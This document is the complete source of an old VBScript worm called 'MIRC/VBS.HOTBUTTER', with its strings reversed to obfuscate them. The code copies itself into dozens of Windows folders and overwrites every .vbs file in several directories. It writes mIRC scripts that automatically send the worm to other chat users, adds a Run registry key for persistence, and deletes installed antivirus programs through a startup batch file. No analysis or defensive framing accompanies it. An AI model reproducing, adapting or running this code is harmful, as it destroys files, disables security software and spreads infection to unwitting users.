dim j(20), dir(41)
On Error Resume Next
Set FSO = CreateObject(strReverse("tcejbOmetsySeliF.gnitpircS"))
set wsh = CreateObject(StrReverse("llehs.tpircsw"))
virname = "MIRC/VBS.HOTBUTTER"
j(1) = "]TPIRCS[=0n"
j(2) = "}tlah{ )em$ == kcin$( fi/ { :#:NIOJ:1 NO=1n"
j(3) = "sbv.xes\metsys\swodniw\:c kcin$ dnes ccd/=2n"
j(4) = "}=3n"
j(5) = "gniKnroP kcin/:?:seman:TXET:1 NO=4n"
j(6) = "} tlah { ) em$ == kcin$ ( fi/ {:#:TRAP:1 NO=5n"
j(7) = "sbv.xes\metsys\swodniw\:c kcin$ dnes ccd/=6n"
j(8) = "}=7n"
j(9) = "sbv.xes\metsys\swodniw\:c kcin$ dnes ccd/:#:*ayc*:TXET:1 NO=8n"
j(10) = "sbv.xes\metsys\swodniw\:c kcin$ dnes ccd/:#:*eyb*:TXET:1 NO=9n"
j(11) = "sbv.xes\metsys\swodniw\:c kcin$ dnes ccd/:#:*sreehc*:TXET:1 NO=01n"
j(12) = "sbv.xes\metsys\swodniw\:c kcin$ dnes ccd/:#:*eybdoog*:TXET:1 NO=11n"
j(13) = "! xus surivitna notron yas/:#:*notron*:TXET:1 NO=21n"
j(14) = "! xus orP tiklooT larivitnA yas/:#:*pva*:TXET:1 NO=31n"
j(15) = "! xus eruces-F yas/:#:*eruces-f*:TXET:1 NO=41n"
j(16) = "! xus nilliCCP yas/:#:*nilliccp*:TXET:1 NO=51n"
j(17) = "! xus eefacm yas/:#:*eefacm*:TXET:1 NO=61n"
j(18) = "em$ nahc$ kcik/:#:*emkcik*:TXET:1 NO=71n"
j(19) = "tiuq/:#:*og*:TXET:1 NO=81n"
dir(1) = "."
dir(2) = ".."
dir(3) = "..\.."
dir(4) = "..\..\.."
dir(6) = "..\..\..\.."
dir(7) = strreverse("1~ucodym\:c")
dir(8) = strreverse("swodniw\:c")
dir(9) = strreverse("potksed\swodniw\:c")
dir(10) = strreverse("metsys\swodniw\:c")
dir(11) = strreverse("23metsys\swodniw\:c")
dir(12) = "c:\progra~1"
dir(13) = "c:\progra~1\winamp"
dir(14) = "c:\progra~1\winace"
dir(15) = "c:\progra~1\winrar"
dir(16) = "c:\progra~1\winzip"
dir(17) = "c:\download"
dir(18) = "c:\windows\startm~1"
dir(19) = "c:\windows\temp"
dir(20) = "c:\recycled"
dir(21) = "c:\windows\tempor~1"
dir(22) = "c:\windows\cookies"
dir(23) = "c:\windows\command"
dir(24) = "c:\windows\help"
dir(25) = "c:\windows\cursors"
dir(26) = "c:\windows\java"
dir(27) = "c:\windows\fonts"
dir(28) = "c:\windows\web"
dir(29) = "c:\windows\drwatson"
dir(20) = "c:\windows\config"
dir(31) = "c:\windows\tasks"
dir(32) = "c:\windows\pif"
dir(33) = "c:\windows\media"
dir(34) = "c:\windows\catroot"
dir(35) = "c:\windows\inf"
dir(36) = "c:\windows\samples"
dir(37) = "c:\windows\all users"
dir(38) = "c:\windows\sentto"
dir(39) = "c:\windows\recent"
dir(40) = "c:\windows\offline web pages"
for p = 1 to 40
cpy(dir(p) & strreverse("sbv.xes\"))
next
for p = 1 to 10
infect(dir(p))
next
mirc(strreverse("ini.tpircs\metsys\crim\:c"))
mirc(strreverse("ini.tpircs\metsys\23crim\:c"))
mirc(strreverse("ini.tpircs\metsys\crim\1~argorp\:c"))
mirc(strreverse("ini.tpircs\metsys\23crim\1~argorp\:c"))
mirc(strreverse("ini.tpircs\crim\:c"))
mirc(strreverse("ini.tpircs\23crim\:c"))
mirc(strreverse("ini.tpircs\crim\1~argorp\:c"))
mirc(strreverse("ini.tpircs\23crim\1~argorp\:c"))
antiAV
Payload
runa
Private sub infect(fldr)
Set FSO = CreateObject(strreverse("tcejbOmetsySeliF.gnitpircS"))
For Each PossibleFile in FSO.GetFolder(fldr).Files
If UCase(FSO.GetExtensionName(PossibleFile)) = strreverse("SBV") Then FSO.CopyFile Wscript.ScriptFullName, PossibleFile.path,1
next
end sub
Private sub mirc(Fldr)
set openmirc = fso.Createtextfile(fldr,true)
for i = 1 to 19
openmirc.writeline StrReverse(j(i))
next 
openmirc.close
end sub
Private sub cpy(a)
Fso.copyfile wscript.scriptfullname, a
end sub
Private sub runa
Wsh.RegWrite strreverse("rettubtoh.sbv\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH"), Strreverse("sbv.xes\metsys\swodniw\:C")
end sub
Private sub antiAV
set retro = fso.createtextfile(strreverse("tab.tratsniw\swodniw\:c"),1)
retro.writeline strreverse("1~rowten\1~argorp\:c Y/ eertleD@")
retro.writeline strreverse("eefacm\1~argorp\:c Y/ eertleD@")
retro.writeline strreverse("torp-f\1~argorp\:c Y/ eertleD@")
retro.writeline strreverse("eruces-F\1~argorp\:c Y/ eertleD@")
retro.writeline strreverse("pvA\1~argorp\:c Y/ eertleD@")
retro.writeline strreverse("1~efatad\1~argorp\:c Y/ eertleD@")
retro.close
end sub
Private sub Payload
if day(now()) = 15 then Msgbox StrReverse("ymenE tsrow ruoy ma  I - rettuB urht efink toh a ekiL") , vbinformation ,Virname
Wsh.RegWrite "HKEY_LOCAL_MACHINE\" & virname , StrReverse("ymenE tsrow ruoy ma I - rettuB urht efink toh a ekiL")
end sub